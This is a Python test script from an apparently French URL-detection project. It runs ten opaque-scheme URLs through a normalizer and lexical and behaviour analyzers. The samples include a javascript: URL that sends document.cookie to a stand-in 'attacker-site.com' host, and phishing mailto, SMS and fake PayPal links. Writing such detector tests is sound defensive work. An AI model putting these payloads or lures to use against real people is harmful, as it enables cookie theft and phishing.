import sys
import os
current_dir = os.path.dirname(os.path.abspath(__file__))
parent_dir = os.path.dirname(current_dir)
parent_dir1 = os.path.dirname(parent_dir)
src_path = os.path.join(parent_dir1, 'Projet-Detecteur-Url')
sys.path.append(src_path)

from App.Parsers.opaque import OpacParser
from App.Analysis.opac.lexical import lexical_O_analyzer
from App.Analysis.opac.behaviour import behaviour_O_analyzer
from App.Core.normalizer import URLNormalizer

test_url=[
    "mailto:admin@secure-bank.com?subject=Security%20Alert&body=Please%20verify%20your%20account%20at%20http://fake-login-update.com/reset",
    "javascript:window.location='http://attacker-site.com/steal.php?cookie='+document.cookie;alert('Hacked');",
    "tel:+1-555-0199;phone-context=emergency",
    "sms:+33612345678?body=Urgent%20colis%20bloque%20cliquez%20ici%20http://bit.ly/malware_apk",
    "bitcoin:1ArmoryXcfq7TnCSuNarfsRLYSm39JFCg7?amount=50&label=Ransomware%20Payment&message=Donation",
    "magnet:?xt=urn:btih:c12fe1c06bba254a9dc9f519b335aa7c1367a88a&dn=Cracked_Software_Installer.exe&tr=udp://tracker.openbittorrent.com:80",
    "blob:https://web.whatsapp.com/9a38f362-7c30-410a-8533-333e4210d735",
    "view-source:http://www.paypal-verification-update.com/login.php?user=target",
    "urn:uuid:6e8bc430-9c3a-11d9-9669-0800200c9a66",
    "about:config"
]
for url in test_url:
    Normal=URLNormalizer(url)
    Nurl=Normal.normalize_url()
    o=OpacParser(Nurl)
    parsed=o.data()
    a1=lexical_O_analyzer(parsed)
    a2=behaviour_O_analyzer(parsed)
    print(f"data parsee: \n {parsed}")
    print(f"analyse lexique \n {a1.analyze()}")
    print(f"analyse de comportement \n {a2.analyze()}")
    print("")
    print("")

